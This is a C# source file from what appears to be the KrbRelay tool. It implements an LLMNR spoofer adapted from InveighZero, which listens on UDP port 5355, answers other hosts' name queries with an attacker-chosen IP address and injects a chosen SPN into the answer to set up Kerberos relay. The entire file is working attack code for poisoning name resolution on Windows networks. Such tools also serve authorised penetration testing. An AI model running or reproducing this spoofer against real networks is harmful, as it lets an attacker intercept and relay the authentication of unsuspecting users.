using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace KrbRelay.Spoofing
{
    class LLMNR
    {
        public static bool stop = false;

        // https://github.com/Kevin-Robertson/InveighZero/blob/b1f2c110dbee0b8a5447613eeef23b9d019ba82a/Inveigh/LLMNR.cs
        public static void LLMNRListener(string IP, string spooferIP, string spooferIPv6, string llmnrTTL, string ipVersion, string spn)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] spooferIPv6Data = new byte[16];

            if (!String.IsNullOrEmpty(spooferIPv6))
            {
                spooferIPv6Data = IPAddress.Parse(spooferIPv6).GetAddressBytes();
            }

            byte[] ttlLLMNR = BitConverter.GetBytes(Int32.Parse(llmnrTTL));
            Array.Reverse(ttlLLMNR);
            IPAddress llmnrListenerIP = IPAddress.Any;

            if (String.Equals(ipVersion, "IPv6"))
            {
                llmnrListenerIP = IPAddress.IPv6Any;
            }

            IPEndPoint llmnrEndpoint = new IPEndPoint(llmnrListenerIP, 5355);
            IPAddress destinationIPAddress = IPAddress.Parse(IP);
            UdpClient llmnrClient = UDP.UDPListener("LLMNR", IP, 5355, ipVersion);

            Console.WriteLine("[*] Starting LLMNR spoofing");
            while (!Program.stopSpoofing)
            {
                try
                {
                    byte[] udpPayload = llmnrClient.Receive(ref llmnrEndpoint);
                    byte[] llmnrType = new byte[2];
                    System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
                    int llmnrSourcePort = llmnrEndpoint.Port;

                    if (BitConverter.ToString(llmnrType) != "00-1C")
                    {
                        string llmnrResponseMessage = "";
                        byte[] llmnrTransactionID = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
                        byte[] llmnrRequest = new byte[udpPayload.Length - 18];
                        byte[] llmnrRequestLength = new byte[1];
                        System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
                        System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                        string llmnrRequestHost = Util.ParseNameQuery(12, udpPayload);
                        IPAddress sourceIPAddress = llmnrEndpoint.Address;
                        llmnrResponseMessage = Util.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString(), IP.ToString(), "LLMNR", null, null);

                        if (String.Equals(llmnrResponseMessage, "response sent"))
                        {
                            byte[] llmnrResponse = LLMNR.GetLLMNRResponse("listener", ipVersion, llmnrTTL, sourceIPAddress, destinationIPAddress, spooferIPData, spooferIPv6Data, Util.IntToByteArray2(llmnrSourcePort), udpPayload, spn);
                            IPEndPoint llmnrDestinationEndPoint = new IPEndPoint(sourceIPAddress, llmnrSourcePort);
                            UDP.UDPListenerClient(sourceIPAddress, llmnrSourcePort, llmnrClient, llmnrResponse);
                            llmnrClient = UDP.UDPListener("LLMNR", IP, 5355, ipVersion);
                        }
                        Console.WriteLine(String.Format("[+] [{0}] LLMNR request for {1} from {2} [{3}]", DateTime.Now.ToString("s"), llmnrRequestHost, sourceIPAddress, llmnrResponseMessage));

                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine(String.Format("[-] [{0}] LLMNR spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }
                
            }
            Console.WriteLine("[*] Stopping LLMNR spoofing");
        }

        public static byte[] GetLLMNRResponse(string type, string ipVersion, string llmnrTTL, IPAddress sourceIPAddress, IPAddress destinationIPAddress, byte[] spooferIPData, byte[] spooferIPv6Data, byte[] udpSourcePort, byte[] udpPayload, string spn)
        {
            byte[] ttlLLMNR = BitConverter.GetBytes(Int32.Parse(llmnrTTL));
            Array.Reverse(ttlLLMNR);
            byte[] llmnrType = new byte[2];
            System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
            byte[] llmnrTransactionID = new byte[2];
            System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
            byte[] llmnrRequest = new byte[udpPayload.Length - 18];
            byte[] llmnrRequestLength = new byte[1];
            System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
            System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
            MemoryStream llmnrMemoryStream = new MemoryStream();

            //Console.WriteLine(String.Format("[{0}] ", ByteArrayToString(llmnrRequest)));
            //Console.WriteLine(String.Format("[{0}] ", Encoding.ASCII.GetString(llmnrRequest)));
            //Console.WriteLine(String.Format("[{0}] ", llmnrRequestLength[0]));

            llmnrMemoryStream.Write(llmnrTransactionID, 0, llmnrTransactionID.Length);
            llmnrMemoryStream.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
            llmnrMemoryStream.Write(llmnrRequestLength, 0, 1);
            llmnrMemoryStream.Write(llmnrRequest, 0, llmnrRequest.Length);

            if (String.Equals(ipVersion, "IPv4"))
            {
                llmnrMemoryStream.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
            }
            else
            {
                llmnrMemoryStream.Write((new byte[5] { 0x00, 0x00, 0x1c, 0x00, 0x01 }), 0, 5);
            }

            // spoof here
            llmnrRequest = Encoding.ASCII.GetBytes(spn);
            llmnrRequestLength[0] = (byte)spn.Length;
            llmnrMemoryStream.Write(llmnrRequestLength, 0, 1);
            llmnrMemoryStream.Write(llmnrRequest, 0, llmnrRequest.Length);

            if (String.Equals(ipVersion, "IPv4"))
            {
                llmnrMemoryStream.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                llmnrMemoryStream.Write(ttlLLMNR, 0, 4);
                llmnrMemoryStream.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                llmnrMemoryStream.Write(spooferIPData, 0, spooferIPData.Length);
            }
            else
            {
                llmnrMemoryStream.Write((new byte[5] { 0x00, 0x00, 0x1c, 0x00, 0x01 }), 0, 5);
                llmnrMemoryStream.Write(ttlLLMNR, 0, 4);
                llmnrMemoryStream.Write((new byte[2] { 0x00, 0x10 }), 0, 2);
                llmnrMemoryStream.Write(spooferIPv6Data, 0, spooferIPv6Data.Length);
            }

            if (String.Equals(type, "sniffer"))
            {
                llmnrMemoryStream.Position = 4;
                llmnrMemoryStream.Write(Util.IntToByteArray2((int)llmnrMemoryStream.Length), 0, 2);
            }

            if (String.Equals(ipVersion, "IPv6"))
            {
                byte[] llmnrPseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int)llmnrMemoryStream.Length);
                UInt16 checkSum = Util.GetPacketChecksum(llmnrPseudoHeader, llmnrMemoryStream.ToArray());
                llmnrMemoryStream.Position = 6;
                byte[] packetChecksum = Util.IntToByteArray2(checkSum);
                Array.Reverse(packetChecksum);
                llmnrMemoryStream.Write(packetChecksum, 0, 2);
            }

            return llmnrMemoryStream.ToArray();
        }

    }

}
